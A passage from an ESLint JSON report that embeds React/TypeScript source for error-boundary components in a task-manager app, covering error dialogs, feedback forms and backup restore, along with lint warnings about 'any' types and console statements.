trying to do?\"\n                variant=\"outlined\"\n                size=\"small\"\n                fullWidth\n                multiline\n                rows={2}\n                value={feedbackData.description}\n                onChange={(e) => setFeedbackData(prev => ({ ...prev, description: e.target.value }))}\n                placeholder=\"Describe what you were doing when the error occurred...\"\n              />\n              \n              <TextField\n                label=\"Steps to reproduce (Optional)\"\n                variant=\"outlined\"\n                size=\"small\"\n                fullWidth\n                multiline\n                rows={2}\n                value={feedbackData.steps}\n                onChange={(e) => setFeedbackData(prev => ({ ...prev, steps: e.target.value }))}\n                placeholder=\"1. Click on...\\n2. Then...\\n3. Error appeared\"\n              />\n              \n              <Box sx={{ display: 'flex', gap: 2 }}>\n                <FormControl size=\"small\">\n                  <FormLabel>Severity</FormLabel>\n                  <RadioGroup\n                    row\n                    value={feedbackData.severity}\n                    onChange={(e) => setFeedbackData(prev => ({ \n                      ...prev, \n                      severity: e.target.value as any \n                    }))}\n                  >\n                    <FormControlLabel value=\"low\" control={<Radio size=\"small\" />} label=\"Low\" />\n                    <FormControlLabel value=\"medium\" control={<Radio size=\"small\" />} label=\"Medium\" />\n                    <FormControlLabel value=\"high\" control={<Radio size=\"small\" />} label=\"High\" />\n                  </RadioGroup>\n                </FormControl>\n              </Box>\n            </Stack>\n          </Card>\n        </Collapse>\n      </DialogContent>\n\n      <DialogActions sx={{ px: 3, pb: 2 }}>\n        {showFeedbackForm ? (\n          <>\n            <Button onClick={() => setShowFeedbackForm(false)}>\n              Cancel\n            </Button>\n            <Button \n              variant=\"contained\" \n              onClick={handleFeedbackSubmit}\n              disabled={!feedbackData.description.trim()}\n            >\n              Submit Feedback\n            </Button>\n          </>\n        ) : (\n          <>\n            <Button onClick={onClose} color=\"inherit\">\n              Dismiss\n            </Button>\n            {allowUserFeedback && (\n              <Button onClick={handleQuickReport} color=\"primary\">\n                <FeedbackIcon sx={{ mr: 1 }} />\n                Quick Report\n              </Button>\n            )}\n            {canRetry && (\n              <Button \n                variant=\"contained\" \n                onClick={onRetry}\n                color=\"primary\"\n                startIcon={<RefreshIcon />}\n              >\n                Try Again\n              </Button>\n            )}\n          </>\n        )}\n      </DialogActions>\n    </Dialog>\n  );\n};\n\n/**\n * MUI Error Snackbar Component\n */\ninterface MUIErrorSnackbarProps {\n  notification: ErrorNotificationState;\n  onClose: () => void;\n  autoHideDuration?: number;\n}\n\nconst _MUIErrorSnackbar: React.FC<MUIErrorSnackbarProps> = ({\n  notification,\n  onClose,\n  autoHideDuration = 6000\n}) => {\n  return (\n    <Snackbar\n      open={notification.open}\n      autoHideDuration={autoHideDuration}\n      onClose={onClose}\n      anchorOrigin={{ vertical: 'top', horizontal: 'right' }}\n    >\n      <Alert \n        onClose={onClose} \n        severity={notification.severity}\n        variant=\"filled\"\n        sx={{ width: '100%' }}\n      >\n        <AlertTitle>\n          {notification.severity === 'error' ? 'Error Reported' : \n           notification.severity === 'success' ? 'Success' : 'Information'}\n        </AlertTitle>\n        {notification.message}\n        {notification.reportId && (\n          <Typography variant=\"caption\" display=\"block\" sx={{ mt: 1, opacity: 0.8 }}>\n            Report ID: {notification.reportId}\n          </Typography>\n        )}\n      </Alert>\n    </Snackbar>\n  );\n};\n\n/**\n * MUI Error Fallback Component\n */\nconst _MUIErrorFallback: React.FC<ErrorFallbackProps & MUIErrorBoundaryProps> = ({\n  error,\n  resetErrorBoundary,\n  retryCount = 0,\n  maxRetries = 3,\n  showDialog = true,\n  showSnackbar = false,\n  allowUserFeedback = true,\n  allowErrorDownload = true,\n  maxWidth = 'md',\n  enableDetailedReporting = true,\n  isolationLevel = 'component'\n}) => {\n  const [dialogOpen, setDialogOpen] = useState(showDialog);\n  const [notification, setNotification] = useState<ErrorNotificationState>({\n    open: false,\n    message: '',\n    severity: 'error'\n  });\n\n  const handleRetry = useCallback(() => {\n    setDialogOpen(false);\n    resetErrorBoundary();\n  }, [resetErrorBoundary]);\n\n  const handleReportError = useCallback(async (feedback?: FeedbackFormData) => {\n    try {\n      const context: Partial<ErrorContext> = {\n        userInitiated: true,\n        severity: feedback?.severity || 'medium',\n        component: 'MUIErrorBoundary',\n        action: 'user_report'\n      };\n\n      const reportId = await errorReportingService.reportError(error, undefined, context);\n\n      if (feedback && reportId) {\n        const userFeedback: Omit<UserFeedback, 'timestamp'> = {\n          reportId,\n          userEmail: feedback.userEmail || undefined,\n          description: feedback.description,\n          steps: feedback.steps || undefined,\n          severity: feedback.severity,\n          category: feedback.category\n        };\n\n        await errorReportingService.submitUserFeedback(userFeedback);\n      }\n\n      setNotification({\n        open: true,\n        message: 'Thank you for reporting this issue. We\\'ll investigate and get back to you.',\n        severity: 'success',\n        reportId: reportId || undefined\n      });\n    } catch (error) {\n      console.error('Failed to submit error report:', error);\n      setNotification({\n        open: true,\n        message: 'Failed to submit error report. Please try again later.',\n        severity: 'error'\n      });\n    }\n  }, [error]);\n\n  const handleDownloadReport = useCallback(() => {\n    try {\n      const report = {\n        error: {\n          name: error.name,\n          message: error.message,\n          stack: error.stack\n        },\n        timestamp: new Date().toISOString(),\n        userAgent: navigator.userAgent,\n        url: window.location.href\n      };\n\n      const blob = new Blob([JSON.stringify(report, null, 2)], { \n        type: 'application/json' \n      });\n      \n      const url = URL.createObjectURL(blob);\n      const a = document.createElement('a');\n      a.href = url;\n      a.download = `error-report-${Date.now()}.json`;\n      document.body.appendChild(a);\n      a.click();\n      document.body.removeChild(a);\n      URL.revokeObjectURL(url);\n\n      setNotification({\n        open: true,\n        message: 'Error report downloaded successfully.',\n        severity: 'success'\n      });\n    } catch (error) {\n      console.error('Failed to download error report:', error);\n      setNotification({\n        open: true,\n        message: 'Failed to download error report.',\n        severity: 'error'\n      });\n    }\n  }, [error]);\n\n  const handleNotificationClose = useCallback(() => {\n    setNotification(prev => ({ ...prev, open: false }));\n  }, []);\n\n  // Auto-show snackbar if configured\n  useEffect(() => {\n    if (showSnackbar && !showDialog) {\n      setNotification({\n        open: true,\n        message: 'An error occurred. You can continue using the application.',\n        severity: 'error'\n      });\n    }\n  }, [showSnackbar, showDialog]);\n\n  return (\n    <>\n      {/* Error Dialog */}\n      <_MUIErrorDialog\n        open={dialogOpen}\n        error={error}\n        onClose={() => setDialogOpen(false)}\n        onRetry={handleRetry}\n        onReportError={handleReportError}\n        onDownloadReport={handleDownloadReport}\n        retryCount={retryCount}\n        maxRetries={maxRetries}\n        allowUserFeedback={allowUserFeedback}\n        allowErrorDownload={allowErrorDownload}\n        maxWidth={maxWidth}\n        enableDetailedReporting={enableDetailedReporting}\n      />\n\n      {/* Error Notification */}\n      <_MUIErrorSnackbar\n        notification={notification}\n        onClose={handleNotificationClose}\n      />\n\n      {/* Fallback UI if dialog is closed */}\n      {!dialogOpen && (\n        <motion.div\n          initial={{ opacity: 0, scale: 0.95 }}\n          animate={{ opacity: 1, scale: 1 }}\n          className=\"flex flex-col items-center justify-center h-full p-8 text-center\"\n        >\n          <Card sx={{ maxWidth: 400, textAlign: 'center', p: 3 }}>\n            <CardContent>\n              <EmergencyIcon sx={{ fontSize: 48, color: 'error.main', mb: 2 }} />\n              <Typography variant=\"h6\" gutterBottom>\n                {isolationLevel === 'page' ? 'Application Error' : 'Component Error'}\n              </Typography>\n              <Typography variant=\"body2\" color=\"text.secondary\" paragraph>\n                {isolationLevel === 'page'\n                  ? 'An unexpected error occurred. Please try refreshing the page.'\n                  : 'This component encountered an error. Other parts of the app should work normally.'\n                }\n              </Typography>\n            </CardContent>\n            <CardActions sx={{ justifyContent: 'center', gap: 1 }}>\n              <Button \n                variant=\"contained\" \n                onClick={handleRetry}\n                startIcon={<RefreshIcon />}\n                disabled={retryCount >= maxRetries}\n              >\n                Try Again\n              </Button>\n              <Button \n                variant=\"outlined\"\n                onClick={() => setDialogOpen(true)}\n                startIcon={<BugReportIcon />}\n              >\n                Report Issue\n              </Button>\n            </CardActions>\n          </Card>\n        </motion.div>\n      )}\n    </>\n  );\n};\n\n/**\n * Main MUI Error Boundary Component\n */\nexport const MUIErrorBoundary: React.FC<MUIErrorBoundaryProps> = ({\n  children,\n  resetKeys,\n  onReset,\n  onError,\n  showDialog = true,\n  showSnackbar = false,\n  ...props\n}) => {\n  const handleError = useCallback((error: Error, errorInfo: ErrorInfo) => {\n    // Report error automatically\n    errorReportingService.reportError(error, errorInfo, {\n      component: 'MUIErrorBoundary',\n      action: 'automatic_report',\n      severity: 'high'\n    });\n\n    // Call custom error handler\n    onError?.(error, errorInfo);\n  }, [onError]);\n\n  return (\n    <ReactErrorBoundary\n      FallbackComponent={(fallbackProps) => (\n        <_MUIErrorFallback\n          {...fallbackProps}\n          showDialog={showDialog}\n          showSnackbar={showSnackbar}\n          {...props}\n          children={children}\n        />\n      )}\n      resetKeys={resetKeys}\n      onReset={(details) => onReset?.(details)}\n      onError={handleError}\n    >\n      {children}\n    </ReactErrorBoundary>\n  );\n};\n\n/**\n * Hook for using MUI error handling\n */\nexport const useMUIErrorHandler = () => {\n  const { showBoundary } = useErrorBoundary();\n  \n  const reportError = useCallback((error: Error, context?: Partial<ErrorContext>) => {\n    // Add context to error if provided\n    if (context) {\n      (error as any).__errorContext = context;\n    }\n    \n    showBoundary(error);\n  }, [showBoundary]);\n\n  return { reportError };\n};\n\n/**\n * Higher-order component wrapper for MUI error boundary\n */\nexport const withMUIErrorBoundary = <P extends object>(\n  Component: React.ComponentType<P>,\n  errorBoundaryProps?: Omit<MUIErrorBoundaryProps, 'children'>\n) => {\n  const WrappedComponent = (props: P) => (\n    <MUIErrorBoundary {...errorBoundaryProps}>\n      <Component {...props} />\n    </MUIErrorBoundary>\n  );\n\n  WrappedComponent.displayName = `withMUIErrorBoundary(${Component.displayName || Component.name})`;\n  \n  return WrappedComponent;\n};\n\n\nexport default MUIErrorBoundary;","usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/src/renderer/src/components/error/StoreErrorBoundary.tsx","messages":[{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":277,"column":40,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":277,"endColumn":43,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[9646,9649],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[9646,9649],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":418,"column":5,"nodeType":"MemberExpression","messageId":"unexpected","endLine":418,"endColumn":18,"suggestions":[{"fix":{"range":[14889,14962],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the console.error()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":453,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":453,"endColumn":20,"suggestions":[{"fix":{"range":[15910,15968],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the console.error()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":478,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":478,"endColumn":20,"suggestions":[{"fix":{"range":[16606,16652],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the console.error()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":514,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":514,"endColumn":20,"suggestions":[{"fix":{"range":[17573,17614],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the console.error()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":532,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":532,"endColumn":20,"suggestions":[{"fix":{"range":[18016,18054],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the console.error()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":550,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":550,"endColumn":20,"suggestions":[{"fix":{"range":[18610,18649],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the console.error()."}]}],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":7,"fixableErrorCount":0,"fixableWarningCount":0,"source":"/**\n * Store Error Boundary Component (2025)\n * \n * This component provides comprehensive error boundary functionality specifically\n * for Zustand store operations with recovery UI and state restoration.\n * \n * Following 2025 React patterns for error boundaries and user experience.\n */\n\nimport { Component, ErrorInfo, ReactNode } from 'react';\nimport { motion, AnimatePresence } from 'framer-motion';\nimport { \n  AlertTriangle, \n  RefreshCw, \n  Download, \n  Upload, \n  Settings, \n \n  Database,\n  Shield,\n  Activity,\n  CheckCircle,\n  XCircle,\n  Info\n} from 'lucide-react';\nimport { useErrorStore, type StoreError, type StoreBackup } from '@/store/errorStore';\nimport { backupService } from '@/store/backupService';\nimport { errorHandledTaskStore } from '@/store/storeErrorWrapper';\n\n// Error boundary state\ninterface StoreErrorBoundaryState {\n  hasError: boolean;\n  error: Error | null;\n  errorInfo: ErrorInfo | null;\n  isRecovering: boolean;\n  recoveryStep: 'diagnosis' | 'backup' | 'restore' | 'complete';\n  recoveryProgress: number;\n  availableBackups: StoreBackup[];\n  selectedBackup: StoreBackup | null;\n  showAdvancedOptions: boolean;\n  autoRecoveryAttempted: boolean;\n}\n\n// Props interface\ninterface StoreErrorBoundaryProps {\n  children: ReactNode;\n  fallback?: ReactNode;\n  onError?: (error: Error, errorInfo: ErrorInfo) => void;\n  enableAutoRecovery?: boolean;\n  maxAutoRecoveryAttempts?: number;\n  showDeveloperInfo?: boolean;\n}\n\n/**\n * Recovery Options Panel\n */\nfunction RecoveryOptionsPanel({\n  availableBackups,\n  selectedBackup,\n  onSelectBackup,\n  onRestore,\n  onReset,\n  onExport,\n  isRecovering,\n  recoveryProgress,\n  showAdvanced,\n  onToggleAdvanced\n}: {\n  availableBackups: StoreBackup[];\n  selectedBackup: StoreBackup | null;\n  onSelectBackup: (backup: StoreBackup | null) => void;\n  onRestore: () => void;\n  onReset: () => void;\n  onExport: () => void;\n  isRecovering: boolean;\n  recoveryProgress: number;\n  showAdvanced: boolean;\n  onToggleAdvanced: () => void;\n}) {\n  return (\n    <div className=\"space-y-6\">\n      {/* Backup Selection */}\n      <div>\n        <h3 className=\"text-lg font-semibold mb-3 flex items-center gap-2\">\n          <Database className=\"w-5 h-5\" />\n          Available Backups\n        </h3>\n        \n        {availableBackups.length === 0 ? (\n          <div className=\"bg-yellow-50 dark:bg-yellow-900/20 border border-yellow-200 dark:border-yellow-800 rounded-lg p-4\">\n            <div className=\"flex items-center gap-2 text-yellow-800 dark:text-yellow-200\">\n              <Info className=\"w-4 h-4\" />\n              <span className=\"text-sm font-medium\">No backups available</span>\n            </div>\n            <p className=\"text-sm text-yellow-700 dark:text-yellow-300 mt-1\">\n              No previous backups were found. You can reset to default state or export current data.\n            </p>\n          </div>\n        ) : (\n          <div className=\"space-y-2 max-h-40 overflow-y-auto\">\n            {availableBackups.map((backup) => (\n              <motion.div\n                key={backup.id}\n                whileHover={{ scale: 1.02 }}\n                className={`p-3 border rounded-lg cursor-pointer transition-all ${\n                  selectedBackup?.id === backup.id\n                    ? 'border-primary bg-primary/5'\n                    : 'border-border hover:border-primary/50'\n                }`}\n                onClick={() => onSelectBackup(\n                  selectedBackup?.id === backup.id ? null : backup\n                )}\n              >\n                <div className=\"flex items-center justify-between\">\n                  <div>\n                    <p className=\"font-medium text-sm\">{backup.storeName}</p>\n                    <p className=\"text-xs text-muted-foreground\">\n                      {new Date(backup.timestamp).toLocaleString()}\n                    </p>\n                  </div>\n                  <div className=\"text-right\">\n                    <p className=\"text-xs text-muted-foreground\">\n                      Version {backup.version}\n                    </p>\n                    <div className=\"flex items-center gap-1 text-xs\">\n                      <Shield className=\"w-3 h-3\" />\n                      Verified\n                    </div>\n                  </div>\n                </div>\n                \n                {selectedBackup?.id === backup.id && (\n                  <motion.div\n                    initial={{ opacity: 0, height: 0 }}\n                    animate={{ opacity: 1, height: 'auto' }}\n                    className=\"mt-2 pt-2 border-t text-xs text-muted-foreground\"\n                  >\n                    <p>Platform: {backup.metadata.userAgent.split(' ')[0]}</p>\n                    <p>Checksum: {backup.checksum.substring(0, 8)}...</p>\n                  </motion.div>\n                )}\n              </motion.div>\n            ))}\n          </div>\n        )}\n      </div>\n\n      {/* Recovery Progress */}\n      <AnimatePresence>\n        {isRecovering && (\n          <motion.div\n            initial={{ opacity: 0, y: -20 }}\n            animate={{ opacity: 1, y: 0 }}\n            exit={{ opacity: 0, y: -20 }}\n            className=\"bg-blue-50 dark:bg-blue-900/20 border border-blue-200 dark:border-blue-800 rounded-lg p-4\"\n          >\n            <div className=\"flex items-center gap-2 mb-3\">\n              <RefreshCw className=\"w-4 h-4 animate-spin text-blue-600\" />\n              <span className=\"text-sm font-medium text-blue-800 dark:text-blue-200\">\n                Recovering data...\n              </span>\n            </div>\n            \n            <div className=\"space-y-2\">\n              <div className=\"flex justify-between text-xs text-blue-700 dark:text-blue-300\">\n                <span>Progress</span>\n                <span>{recoveryProgress}%</span>\n              </div>\n              \n              <div className=\"w-full bg-blue-200 dark:bg-blue-800 rounded-full h-2\">\n                <motion.div\n                  className=\"bg-blue-600 h-2 rounded-full\"\n                  initial={{ width: 0 }}\n                  animate={{ width: `${recoveryProgress}%` }}\n                  transition={{ duration: 0.5 }}\n                />\n              </div>\n            </div>\n          </motion.div>\n        )}\n      </AnimatePresence>\n\n      {/* Action Buttons */}\n      <div className=\"space-y-3\">\n        <div className=\"grid grid-cols-1 sm:grid-cols-2 gap-3\">\n          <motion.button\n            whileHover={{ scale: 1.05 }}\n            whileTap={{ scale: 0.95 }}\n            onClick={onRestore}\n            disabled={!selectedBackup || isRecovering}\n            className=\"flex items-center justify-center gap-2 px-4 py-3 bg-primary text-primary-foreground rounded-lg hover:bg-primary/90 transition-colors disabled:opacity-50 disabled:cursor-not-allowed\"\n          >\n            <Download className=\"w-4 h-4\" />\n            Restore from Backup\n          </motion.button>\n          \n          <motion.button\n            whileHover={{ scale: 1.05 }}\n            whileTap={{ scale: 0.95 }}\n            onClick={onReset}\n            disabled={isRecovering}\n            className=\"flex items-center justify-center gap-2 px-4 py-3 bg-destructive text-destructive-foreground rounded-lg hover:bg-destructive/90 transition-colors disabled:opacity-50\"\n          >\n            <RefreshCw className=\"w-4 h-4\" />\n            Reset to Default\n          </motion.button>\n        </div>\n        \n        <motion.button\n          whileHover={{ scale: 1.02 }}\n          whileTap={{ scale: 0.98 }}\n          onClick={onExport}\n          disabled={isRecovering}\n          className=\"w-full flex items-center justify-center gap-2 px-4 py-2 bg-secondary text-secondary-foreground rounded-lg hover:bg-secondary/90 transition-colors disabled:opacity-50\"\n        >\n          <Upload className=\"w-4 h-4\" />\n          Export Current Data\n        </motion.button>\n      </div>\n\n      {/* Advanced Options */}\n      <div>\n        <button\n          onClick={onToggleAdvanced}\n          className=\"text-sm text-muted-foreground hover:text-foreground transition-colors flex items-center gap-1\"\n        >\n          <Settings className=\"w-3 h-3\" />\n          Advanced Options\n        </button>\n        \n        <AnimatePresence>\n          {showAdvanced && (\n            <motion.div\n              initial={{ opacity: 0, height: 0 }}\n              animate={{ opacity: 1, height: 'auto' }}\n              exit={{ opacity: 0, height: 0 }}\n              className=\"mt-2 p-3 bg-muted/50 rounded-lg space-y-2\"\n            >\n              <button\n                onClick={() => errorHandledTaskStore.resetCircuitBreakers()}\n                className=\"text-xs text-muted-foreground hover:text-foreground transition-colors\"\n              >\n                Reset Circuit Breakers\n              </button>\n              \n              <button\n                onClick={() => useErrorStore.getState().clearAllErrors()}\n                className=\"text-xs text-muted-foreground hover:text-foreground transition-colors\"\n              >\n                Clear Error History\n              </button>\n              \n              <button\n                onClick={() => backupService.startAutoBackup()}\n                className=\"text-xs text-muted-foreground hover:text-foreground transition-colors\"\n              >\n                Enable Auto-Backup\n              </button>\n            </motion.div>\n          )}\n        </AnimatePresence>\n      </div>\n    </div>\n  );\n}\n\n/**\n * Error Diagnosis Panel\n */\nfunction ErrorDiagnosisPanel({\n  error,\n  storeErrors,\n  circuitBreakerStates\n}: {\n  error: Error | null;\n  storeErrors: StoreError[];\n  circuitBreakerStates: Record<string, any>;\n}) {\n  const criticalErrors = storeErrors.filter(e => e.severity === 'critical');\n  const recentErrors = storeErrors.slice(0, 5);\n\n  return (\n    <div className=\"space-y-4\">\n      <h3 className=\"text-lg font-semibold flex items-center gap-2\">\n        <Activity className=\"w-5 h-5\" />\n        Error Diagnosis\n      </h3>\n\n      {/* Main Error */}\n      {error && (\n        <div className=\"bg-red-50 dark:bg-red-900/20 border border-red-200 dark:border-red-800 rounded-lg p-4\">\n          <div className=\"flex items-start gap-3\">\n            <XCircle className=\"w-5 h-5 text-red-600 mt-0.5 flex-shrink-0\" />\n            <div className=\"flex-1 min-w-0\">\n              <p className=\"font-medium text-red-800 dark:text-red-200 text-sm\">\n                {error.name}: {error.message}\n              </p>\n              {process.env.NODE_ENV === 'development' && error.stack && (\n                <details className=\"mt-2\">\n                  <summary className=\"text-xs text-red-700 dark:text-red-300 cursor-pointer\">\n                    Stack Trace\n                  </summary>\n                  <pre className=\"text-xs text-red-600 dark:text-red-400 mt-1 overflow-auto max-h-20 whitespace-pre-wrap\">\n                    {error.stack}\n                  </pre>\n                </details>\n              )}\n            </div>\n          </div>\n        </div>\n      )}\n\n      {/* Critical Errors */}\n      {criticalErrors.length > 0 && (\n        <div className=\"bg-orange-50 dark:bg-orange-900/20 border border-orange-200 dark:border-orange-800 rounded-lg p-4\">\n          <h4 className=\"font-medium text-orange-800 dark:text-orange-200 text-sm mb-2\">\n            Critical Store Errors ({criticalErrors.length})\n          </h4>\n          <div className=\"space-y-1\">\n            {criticalErrors.slice(0, 3).map((error) => (\n              <p key={error.id} className=\"text-xs text-orange-700 dark:text-orange-300\">\n                {error.operation}: {error.message}\n              </p>\n            ))}\n            {criticalErrors.length > 3 && (\n              <p className=\"text-xs text-orange-600 dark:text-orange-400\">\n                ...and {criticalErrors.length - 3} more\n              </p>\n            )}\n          </div>\n        </div>\n      )}\n\n      {/* Circuit Breaker Status */}\n      <div className=\"bg-card border rounded-lg p-4\">\n        <h4 className=\"font-medium text-sm mb-3\">Circuit Breaker Status</h4>\n        <div className=\"grid grid-cols-1 sm:grid-cols-3 gap-3\">\n          {Object.entries(circuitBreakerStates).map(([type, state]) => (\n            <div key={type} className=\"text-center\">\n              <div className={`w-3 h-3 rounded-full mx-auto mb-1 ${\n                state.isOpen ? 'bg-red-500' : 'bg-green-500'\n              }`} />\n              <p className=\"text-xs font-medium capitalize\">{type}</p>\n              <p className=\"text-xs text-muted-foreground\">\n                {state.isOpen ? 'Open' : 'Closed'}\n              </p>\n              {state.failureCount > 0 && (\n                <p className=\"text-xs text-muted-foreground\">\n                  {state.failureCount} failures\n                </p>\n              )}\n            </div>\n          ))}\n        </div>\n      </div>\n\n      {/* Recent Errors */}\n      {recentErrors.length > 0 && (\n        <div className=\"bg-card border rounded-lg p-4\">\n          <h4 className=\"font-medium text-sm mb-3\">Recent Errors</h4>\n          <div className=\"space-y-2 max-h-32 overflow-y-auto\">\n            {recentErrors.map((error) => (\n              <div key={error.id} className=\"text-xs\">\n                <div className=\"flex items-center justify-between\">\n                  <span className=\"font-medium\">{error.operation}</span>\n                  <span className={`px-1 rounded text-xs ${\n                    error.severity === 'critical' ? 'bg-red-100 text-red-800' :\n                    error.severity === 'high' ? 'bg-orange-100 text-orange-800' :\n                    error.severity === 'medium' ? 'bg-yellow-100 text-yellow-800' :\n                    'bg-blue-100 text-blue-800'\n                  }`}>\n                    {error.severity}\n                  </span>\n                </div>\n                <p className=\"text-muted-foreground truncate\">{error.message}</p>\n                <p className=\"text-muted-foreground\">\n                  {new Date(error.timestamp).toLocaleTimeString()}\n                </p>\n              </div>\n            ))}\n          </div>\n        </div>\n      )}\n    </div>\n  );\n}\n\n/**\n * Main Store Error Boundary Component\n */\nexport class StoreErrorBoundary extends Component<StoreErrorBoundaryProps, StoreErrorBoundaryState> {\n  private autoRecoveryAttempts = 0;\n\n  constructor(props: StoreErrorBoundaryProps) {\n    super(props);\n    this.state = {\n      hasError: false,\n      error: null,\n      errorInfo: null,\n      isRecovering: false,\n      recoveryStep: 'diagnosis',\n      recoveryProgress: 0,\n      availableBackups: [],\n      selectedBackup: null,\n      showAdvancedOptions: false,\n      autoRecoveryAttempted: false\n    };\n  }\n\n  static getDerivedStateFromError(error: Error): Partial<StoreErrorBoundaryState> {\n    return {\n      hasError: true,\n      error\n    };\n  }\n\n  componentDidCatch(error: Error, errorInfo: ErrorInfo) {\n    console.error('Store Error Boundary caught an error:', error, errorInfo);\n    \n    this.setState({ errorInfo });\n    \n    // Add error to error store\n    useErrorStore.getState().addError({\n      code: 'REACT_ERROR_BOUNDARY',\n      message: `React Error Boundary: ${error.message}`,\n      stack: error.stack,\n      context: { componentStack: errorInfo.componentStack },\n      severity: 'critical',\n      retryable: true,\n      operation: 'render',\n      store: 'react',\n      recovered: false,\n      reported: false\n    });\n\n    // Call onError prop\n    this.props.onError?.(error, errorInfo);\n\n    // Load available backups\n    this.loadAvailableBackups();\n\n    // Attempt auto-recovery if enabled\n    if (this.props.enableAutoRecovery && !this.state.autoRecoveryAttempted) {\n      this.attemptAutoRecovery();\n    }\n  }\n\n  private async loadAvailableBackups() {\n    try {\n      const backups = await backupService.listBackups('taskStore');\n      this.setState({ availableBackups: backups });\n    } catch (error) {\n      console.error('Failed to load available backups:', error);\n    }\n  }\n\n  private async attemptAutoRecovery() {\n    const maxAttempts = this.props.maxAutoRecoveryAttempts || 3;\n    \n    if (this.autoRecoveryAttempts >= maxAttempts) {\n      return;\n    }\n\n    this.autoRecoveryAttempts++;\n    this.setState({ autoRecoveryAttempted: true });\n\n    try {\n      // Try to find the best backup for auto-recovery\n      const bestBackup = await backupService.findBestBackup('taskStore');\n      \n      if (bestBackup) {\n        await this.restoreFromBackup(bestBackup);\n      } else {\n        // No backup available, reset to default state\n        this.resetToDefault();\n      }\n    } catch (error) {\n      console.error('Auto-recovery failed:', error);\n    }\n  }\n\n  private async restoreFromBackup(backup: StoreBackup) {\n    this.setState({ \n      isRecovering: true, \n      recoveryStep: 'restore',\n      selectedBackup: backup \n    });\n\n    try {\n      // Simulate recovery progress\n      for (let i = 0; i <= 100; i += 20) {\n        this.setState({ recoveryProgress: i });\n        await new Promise(resolve => setTimeout(resolve, 100));\n      }\n\n      await backupService.restoreBackup(backup.id);\n      \n      // Apply restored state to the store\n      // This would typically involve calling store reset and load methods\n      \n      this.setState({\n        hasError: false,\n        error: null,\n        errorInfo: null,\n        isRecovering: false,\n        recoveryStep: 'complete',\n        recoveryProgress: 100\n      });\n\n      // Mark error as recovered\n      useErrorStore.getState().markErrorRecovered('react-error-boundary');\n      \n    } catch (error) {\n      console.error('Recovery failed:', error);\n      this.setState({ isRecovering: false, recoveryProgress: 0 });\n    }\n  }\n\n  private resetToDefault() {\n    try {\n      // Reset the store to default state\n      errorHandledTaskStore.resetStore();\n      \n      this.setState({\n        hasError: false,\n        error: null,\n        errorInfo: null,\n        isRecovering: false,\n        recoveryStep: 'complete'\n      });\n    } catch (error) {\n      console.error('Reset failed:', error);\n    }\n  }\n\n  private exportCurrentData() {\n    try {\n      const data = errorHandledTaskStore.exportToJSON();\n      const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });\n      const url = URL.createObjectURL(blob);\n      \n      const a = document.createElement('a');\n      a.href = url;\n      a.download = `taskmaster-backup-${new Date().toISOString().split('T')[0]}.json`;\n      document.body.appendChild(a);\n      a.click();\n      document.body.removeChild(a);\n      URL.revokeObjectURL(url);\n    } catch (error) {\n      console.error('Export failed:', error);\n    }\n  }\n\n  render() {\n    if (this.state.hasError) {\n      if (this.props.fallback) {\n        return this.props.fallback;\n      }\n\n      const storeErrors = useErrorStore.getState().errors;\n      const circuitBreakerStates = errorHandledTaskStore.getCircuitBreakerStates();\n\n      return (\n        <div className=\"min-h-screen bg-background flex items-center justify-center p-6\">\n          <motion.div\n            initial={{ opacity: 0, scale: 0.95 }}\n            animate={{ opacity: 1, scale: 1 }}\n            className=\"max-w-4xl w-full bg-card border rounded-lg shadow-lg\"\n          >\n            <div className=\"p-6 border-b\">\n              <div className=\"flex items-center gap-3\">\n                <div className=\"w-12 h-12 bg-destructive/10 rounded-lg flex items-center justify-center\">\n                  <AlertTriangle className=\"w-6 h-6 text-destructive\" />\n                </div>\n                <div>\n                  <h1 className=\"text-xl font-semibold\">Application Error</h1>\n                  <p className=\"text-muted-foreground\">\n                    Something went wrong. Don't worry, your data can be recovered.\n                  </p>\n                </div>\n              </div>\n            </div>\n\n            <div className=\"p-6\">\n              <div className=\"grid grid-cols-1 lg:grid-cols-2 gap-6\">\n                <ErrorDiagnosisPanel\n                  error={this.state.error}\n                  storeErrors={storeErrors}\n                  circuitBreakerStates={circuitBreakerStates}\n                />\n                \n                <RecoveryOptionsPanel\n                  availableBackups={this.state.availableBackups}\n                  selectedBackup={this.state.selectedBackup}\n                  onSelectBackup={(backup) => this.setState({ selectedBackup: backup })}\n                  onRestore={() => this.state.selectedBackup && this.restoreFromBackup(this.state.selectedBackup)}\n                  onReset={() => this.resetToDefault()}\n                  onExport={() => this.exportCurrentData()}\n                  isRecovering={this.state.isRecovering}\n                  recoveryProgress={this.state.recoveryProgress}\n                  showAdvanced={this.state.showAdvancedOptions}\n                  onToggleAdvanced={() => this.setState({ showAdvancedOptions: !this.state.showAdvancedOptions })}\n                />\n              </div>\n            </div>\n\n            {/* Success Message */}\n            <AnimatePresence>\n              {this.state.recoveryStep === 'complete' 